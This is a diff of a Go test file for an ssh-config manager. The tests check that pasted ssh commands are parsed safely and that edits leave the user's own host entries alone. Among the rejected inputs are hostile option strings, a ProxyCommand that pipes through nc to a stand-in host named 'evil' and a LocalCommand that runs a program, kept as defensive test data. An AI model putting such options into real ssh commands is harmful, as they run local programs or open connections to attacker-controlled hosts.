@@ -1,24 +1,28 @@
+// Tests that ParseCommand and the managed-block edits touch only what they own.
+//
+//	TestParseCommandCarriesTheConnectionAndRefusesTheRest, TestAddAndRemoveTouchOnlyTheManagedBlock
+//	TestUpdateRewritesOneManagedEntryInPlace
 package sshconfig
 
 import (
+	"errors"
 	"os"
 	"path/filepath"
 	"strings"
 	"testing"
+
+	"github.com/cyber-shuttle/cs-control/internal/testutil"
 )
 
 func TestParseCommandCarriesTheConnectionAndRefusesTheRest(t *testing.T) {
 	host, err := ParseCommand("delta", "ssh -p 2222 -i ~/.ssh/id_ed25519 -J bastion -o StrictHostKeyChecking=accept-new me@login.example.edu")
-	if err != nil {
-		t.Fatal(err)
-	}
+	testutil.Check(t, err)
 	if host.Hostname != "login.example.edu" || host.User != "me" || host.Port != 2222 || host.IdentityFile != "~/.ssh/id_ed25519" {
 		t.Fatalf("connection not carried: %+v", host)
 	}
 	if strings.Join(host.ExtraDirectives, ",") != "ProxyJump bastion,StrictHostKeyChecking accept-new" {
 		t.Fatalf("directives not carried: %+v", host.ExtraDirectives)
 	}
-	// A pasted command must never become a local program or a second line.
 	for _, command := range []string{
 		"ssh -o ProxyCommand=nc\\ evil\\ 22 host",
 		"ssh -o LocalCommand=id host",
@@ -30,7 +34,7 @@ func TestParseCommandCarriesTheConnectionAndRefusesTheRest(t *testing.T) {
 			t.Fatalf("accepted %q", command)
 		}
 	}
-	if _, err := ParseCommand("bad alias", "ssh host"); err != ErrInvalidAlias {
+	if _, err := ParseCommand("bad alias", "ssh host"); !errors.Is(err, ErrInvalidAlias) {
 		t.Fatalf("alias not validated: %v", err)
 	}
 }
@@ -39,24 +43,16 @@ func TestAddAndRemoveTouchOnlyTheManagedBlock(t *testing.T) {
 	dir := t.TempDir()
 	path := filepath.Join(dir, "config")
 	const mine = "Host mine\n  HostName mine.example.edu\n"
-	if err := os.WriteFile(path, []byte(mine), 0o600); err != nil {
-		t.Fatal(err)
-	}
-	config := Config{UserPath: path, SystemPath: filepath.Join(dir, "absent")}
+	testutil.Check(t, os.WriteFile(path, []byte(mine), 0o600))
+	config := Config{UserPath: path}
 	added, err := ParseCommand("delta", "ssh me@login.example.edu")
-	if err != nil {
-		t.Fatal(err)
-	}
-	if err := config.Add(added); err != nil {
-		t.Fatal(err)
-	}
+	testutil.Check(t, err)
+	testutil.Check(t, config.Add(added))
 	if err := config.Add(added); err == nil {
 		t.Fatal("a configured alias was overwritten")
 	}
 	hosts, err := config.List()
-	if err != nil {
-		t.Fatal(err)
-	}
+	testutil.Check(t, err)
 	state := map[string]bool{}
 	for _, host := range hosts {
 		state[host.Name] = host.Managed
@@ -64,17 +60,12 @@ func TestAddAndRemoveTouchOnlyTheManagedBlock(t *testing.T) {
 	if len(hosts) != 2 || !state["delta"] || state["mine"] {
 		t.Fatalf("managed state is wrong: %+v", hosts)
 	}
-	// The user's own entry is never rewritten, and never removable here.
 	if err := config.Remove("mine"); err == nil {
 		t.Fatal("removed an unmanaged host")
 	}
-	if err := config.Remove("delta"); err != nil {
-		t.Fatal(err)
-	}
+	testutil.Check(t, config.Remove("delta"))
 	data, err := os.ReadFile(path)
-	if err != nil {
-		t.Fatal(err)
-	}
+	testutil.Check(t, err)
 	if !strings.HasPrefix(string(data), mine) || strings.Contains(string(data), "login.example.edu") {
 		t.Fatalf("file lost the user's own entry or kept the removed one:\n%s", data)
 	}
@@ -86,30 +77,20 @@ func TestAddAndRemoveTouchOnlyTheManagedBlock(t *testing.T) {
 func TestUpdateRewritesOneManagedEntryInPlace(t *testing.T) {
 	dir := t.TempDir()
 	path := filepath.Join(dir, "config")
-	config := Config{UserPath: path, SystemPath: filepath.Join(dir, "absent")}
+	config := Config{UserPath: path}
 	for _, command := range []struct{ alias, command string }{
 		{"delta", "ssh me@login.example.edu"},
 		{"anvil", "ssh me@anvil.example.edu"},
 	} {
 		host, err := ParseCommand(command.alias, command.command)
-		if err != nil {
-			t.Fatal(err)
-		}
-		if err := config.Add(host); err != nil {
-			t.Fatal(err)
-		}
+		testutil.Check(t, err)
+		testutil.Check(t, config.Add(host))
 	}
 	edited, err := ParseCommand("delta", "ssh -p 2222 -i ~/.ssh/id_ed25519 -J bastion you@login2.example.edu")
-	if err != nil {
-		t.Fatal(err)
-	}
-	if err := config.Update(edited); err != nil {
-		t.Fatal(err)
-	}
+	testutil.Check(t, err)
+	testutil.Check(t, config.Update(edited))
 	hosts, err := config.List()
-	if err != nil {
-		t.Fatal(err)
-	}
+	testutil.Check(t, err)
 	byName := map[string]Host{}
 	for _, host := range hosts {
 		byName[host.Name] = host
@@ -120,7 +101,6 @@ func TestUpdateRewritesOneManagedEntryInPlace(t *testing.T) {
 	if got := byName["delta"]; got.Hostname != "login2.example.edu" || got.User != "you" || got.Port != 2222 || !got.Managed {
 		t.Fatalf("delta was not rewritten: %+v", got)
 	}
-	// The neighbour in the same block keeps every field the edit did not name.
 	if got := byName["anvil"]; got.Hostname != "anvil.example.edu" || got.User != "me" {
 		t.Fatalf("editing one entry disturbed another: %+v", got)
 	}
